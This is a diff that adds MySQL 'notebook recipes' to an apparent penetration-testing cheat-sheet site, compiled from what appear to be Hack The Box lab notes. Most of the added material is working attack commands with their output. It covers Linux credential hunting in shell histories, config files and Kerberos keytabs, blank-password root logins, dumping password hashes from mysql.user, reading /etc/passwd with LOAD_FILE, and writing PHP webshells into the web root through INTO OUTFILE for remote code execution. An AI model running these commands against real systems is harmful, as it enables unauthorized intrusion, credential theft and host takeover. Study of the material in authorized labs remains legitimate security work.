@@ -11,6 +11,8 @@ hideFooterPagination: true
 
 Replace UPPER_CASE values with your lab values.
 
+[Search this tool’s saved examples](/commands/notebook?tool=mysql) · [All tools](/index)
+
 ## Commands
 
 **Kali / MySQL prompt**
@@ -25,8 +27,463 @@ SHOW TABLES;
 
 [Find another command](/index) · [Ports](/enumeration/ports-cheatsheet)
 
-[More saved commands for this tool](https://dashboard-aed21664.mintlify.site/find-anything?q=mysql)
+## Notebook recipes
 
-## Learning and original examples
+31 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
-- [MySQL and MariaDB Enumeration](/enumeration/mysql-mariadb-cheat-sheet)
+<AccordionGroup>
+
+<Accordion title="5. Credential hunting (Linux)">
+
+### 5. Credential hunting (Linux)
+
+**Active Directory Attack Path: Worked Lab**
+
+```bash
+sudo -l                                               # #1 — instant win if misconfigured
+cat ~/.bash_history; cat /home/*/.bash_history 2>/dev/null
+history | grep -iE "ssh|mysql|psql|password|sshpass|curl|wget"
+ls -la ~/.ssh /home/*/.ssh 2>/dev/null                # keys to pivot with
+grep -riI "pass\|secret\|cred" /etc /opt /var/www /home 2>/dev/null | grep -v Binary
+# Kerberos artifacts (domain-joined Linux) -> Pass-the-Ticket:
+find / -name '*.keytab' 2>/dev/null; ls -la /etc/krb5.keytab 2>/dev/null
+ls -la /tmp/krb5cc_* 2>/dev/null; env | grep KRB5
+```
+
+</Accordion>
+
+<Accordion title="MySQL - Connecting to the SQL Server">
+
+### MySQL - Connecting to the SQL Server
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+grcic550@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+
+Welcome to the MariaDB monitor. Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MySQL [(none)]>
+```
+
+</Accordion>
+
+<Accordion title="Select a Database">
+
+### Select a Database
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+mysql> USE htbusers;
+
+Database changed
+```
+
+</Accordion>
+
+<Accordion title="Show Tables">
+
+### Show Tables
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+mysql> SHOW TABLES;
+
++----------------------------+
+| Tables_in_htbusers         |
++----------------------------+
+| actions                    |
+| permissions                |
+| permissions_roles          |
+| permissions_users          |
+| roles                      |
+| roles_users                |
+| settings                   |
+| users                      |
++----------------------------+
+8 rows in set (0.00 sec)
+```
+
+**Attacking SQL Databases: Module Notes**
+
+```text
+mysql> SELECT * FROM users;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+4 rows in set (0.00 sec)
+```
+
+</Accordion>
+
+<Accordion title="Execute Commands">
+
+### Execute Commands
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> SELECT "<?php echo shell_exec($_GET['c']);?>" INTO OUTFILE '/var/www/html/webshell.php';
+
+Query OK, 1 row affected (0.001 sec)
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> show variables like "secure_file_priv";
+
++------------------+-------+
+| Variable_name    | Value |
++------------------+-------+
+| secure_file_priv |       |
++------------------+-------+
+
+1 row in set (0.005 sec)
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> select LOAD_FILE("/etc/passwd");
+
++--------------------------+
+| LOAD_FILE("/etc/passwd")
++--------------------------------------------------+
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+
+<SNIP>
+```
+
+</Accordion>
+
+<Accordion title="MySQL">
+
+### MySQL
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ mysql -u username -pPassword123 -h 10.129.20.13
+
+We can easily start an interactive SQL Session using Windows:
+```
+
+**Footprinting: Service-by-Service Lab Workflow**
+
+```bash
+# Connect
+mysql -u <user> -p
+mysql -u root                          # try no password
+mysql -u <user>                        # try no password
+
+# Useful queries
+show databases;
+use <database>;
+show tables;
+select * from users;
+```
+
+</Accordion>
+
+<Accordion title="Read/Change the Database">
+
+### Read/Change the Database
+
+**Common Services: Full Module Reference**
+
+```bash
+grcic550@htb[/htb]$ mysql -u julio -pPassword123 -h 10.129.20.13
+
+Welcome to the MariaDB monitor. Commands end with ; or \g.
+Your MySQL connection id is 8
+Server version: 8.0.28-0ubuntu0.20.04.3 (Ubuntu)
+```
+
+</Accordion>
+
+<Accordion title="SQL Syntax">
+
+### SQL Syntax
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> SHOW DATABASES;
+
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| htbusers           |
++--------------------+
+2 rows in set (0.00 sec)
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> USE htbusers;
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> SHOW TABLES;
+
++----------------------------+
+| Tables_in_htbusers         |
++----------------------------+
+| actions                    |
+| permissions                |
+| permissions_roles          |
+| permissions_users          |
+| roles                      |
+| roles_users                |
+| settings                   |
+| users                      |
++----------------------------+
+```
+
+**Common Services: Full Module Reference**
+
+```bash
+mysql> SELECT * FROM users;
+
++----+---------------+------------+---------------------+
+| id | username      | password   | date_of_joining     |
++----+---------------+------------+---------------------+
+|  1 | admin         | p@ssw0rd   | 2020-07-02 00:00:00 |
+|  2 | administrator | adm1n_p@ss | 2020-07-02 11:30:50 |
+|  3 | john          | john123!   | 2020-07-02 11:47:16 |
+|  4 | tom           | tom123!    | 2020-07-02 12:23:16 |
++----+---------------+------------+---------------------+
+```
+
+</Accordion>
+
+<Accordion title="Phase 2 — Direct MariaDB Access (and Why This Isn&#x27;t &quot;SQL Injection&quot;)">
+
+### Phase 2 — Direct MariaDB Access (and Why This Isn't "SQL Injection")
+
+**Common Services: Personal Assessment Notes**
+
+```text
+mysql -h $target -u fiona -p987654321 --ssl=FALSE
+```
+
+</Accordion>
+
+<Accordion title="High-value Windows locations">
+
+### High-value Windows locations
+
+**Find Credentials on Windows**
+
+```text
+URL:  mysql://localhost:3306/mydatabase
+user: bd_user
+pass: +mQwYxIFaEjZ/MWJDkm1SCWhHw7xPXWd
+
+loginUrl = "login.aspx"
+user1:password1
+user2:password2
+```
+
+</Accordion>
+
+<Accordion title="Connecting &amp; interacting">
+
+### Connecting & interacting
+
+**MySQL and MariaDB Enumeration**
+
+```bash
+mysql -u <user> -p<password> -h <IP>     # NOTE: no space between -p and the password
+mysql -u root   -h <IP>                  # prompt-less attempt (blank password)
+```
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: USE &lt;db>; Switch into a database
+
+```text
+USE <db>;
+```
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: SHOW TABLES; List tables in the current database
+
+```text
+SHOW TABLES;
+```
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: SELECT * FROM &lt;table>; Dump a table's rows
+
+```text
+SELECT * FROM <table>;
+```
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: SELECT version(); Server version → maps to CVEs
+
+```text
+SELECT version();
+```
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: SELECT user, authentication_string FROM mysql.user; Dump usernames + password hashes  (needs privileges)
+
+```text
+SELECT user, authentication_string FROM mysql.user;
+```
+
+</Accordion>
+
+<Accordion title="Footprinting &amp; scanning">
+
+### Footprinting & scanning
+
+**MySQL and MariaDB Enumeration**
+
+```bash
+sudo nmap <IP> -sV -sC -p3306 --script mysql*
+```
+
+**MySQL and MariaDB Enumeration**
+
+```bash
+mysql -u root -h <IP>      # try a blank-password root login directly
+```
+
+</Accordion>
+
+<Accordion title="From DB access to the filesystem (and RCE)">
+
+### From DB access to the filesystem (and RCE)
+
+**MySQL and MariaDB Enumeration**
+
+```sql
+-- Check whether file operations are allowed and where they're confined
+SHOW VARIABLES LIKE 'secure_file_priv';
+
+-- Read an arbitrary local file as the MySQL service account
+SELECT LOAD_FILE('/etc/passwd');
+
+-- Write a PHP webshell into the web root → browse to it for RCE
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+```
+
+</Accordion>
+
+<Accordion title="Mental Model — &quot;What Do I Use When?&quot;">
+
+### Mental Model — "What Do I Use When?"
+
+**Ports, Protocols, and Services by Purpose**
+
+```text
+"I found an open port"
+├── Is it a file share?    → SMB (445), NFS (2049), FTP (21)
+├── Is it remote access?   → SSH (22), RDP (3389), WinRM (5985)
+├── Is it a web server?    → HTTP (80/443) → fingerprint → fuzz
+├── Is it email?           → SMTP (25), IMAP (143), POP3 (110)
+├── Is it a database?      → MySQL (3306), MSSQL (1433), Oracle (1521)
+├── Is it monitoring?      → SNMP (161), IPMI (623)
+└── Not sure?              → nmap -sV -sC <IP> -p <port>
+
+"I need to get files off the target"
+├── Linux → scp/sftp (22)
+├── Windows → SMB (445) or evil-winrm download
+├── Web → wget/curl
+└── Simple → python3 -m http.server (on target)
+
+"I need to get files onto the target"
+├── Linux → scp/sftp (22) or wget from attacker
+├── Windows → SMB, certutil, PowerShell wget
+├── Web upload → if upload form exists
+└── Simple → python3 -m http.server (on attacker)
+
+"I need a shell"
+├── Linux → SSH (22)
+├── Windows → Evil-WinRM (5985), PsExec (445), RDP (3389)
+└── Either → reverse shell via exploit
+```
+
+</Accordion>
+
+<Accordion title="Default system databases">
+
+### Default system databases
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: The data  you  want is in the non-default databases —  SHOW DATABASES;  and look past the four above. ( mysql.user  is the exception: it's a system table but holds the password hashes you'll want to dump.)
+
+```text
+SHOW DATABASES;
+```
+
+</Accordion>
+
+<Accordion title="Why a database login can become host compromise">
+
+### Why a database login can become host compromise
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: Write files  to disk ( INTO OUTFILE ), e.g. dropping a PHP webshell into the web root for instant RCE.
+
+```text
+INTO OUTFILE
+```
+
+**MySQL and MariaDB Enumeration**
+
+Context from the notebook: The setting that gates file read/write is  secure_file_priv : if it's empty, file operations can target  any  path (dangerous); if it points to a folder, they're confined to it; if it's  NULL , they're disabled. Checking this value ( SHOW VARIABLES LIKE 'secure_file_priv'; ) tells you immediately whether the file-based attacks below are on the table.
+
+```text
+SHOW VARIABLES LIKE 'secure_file_priv';
+```
+
+</Accordion>
+
+<Accordion title="Database Protocols">
+
+### Database Protocols
+
+**Ports, Protocols, and Services by Purpose**
+
+Context from the notebook: MySQL 3306 mysql -u &lt;user> -p&lt;pass> -h &lt;IP>
+
+```text
+mysql -u <user> -p<pass> -h <IP>
+```
+
+</Accordion>
+
+</AccordionGroup>
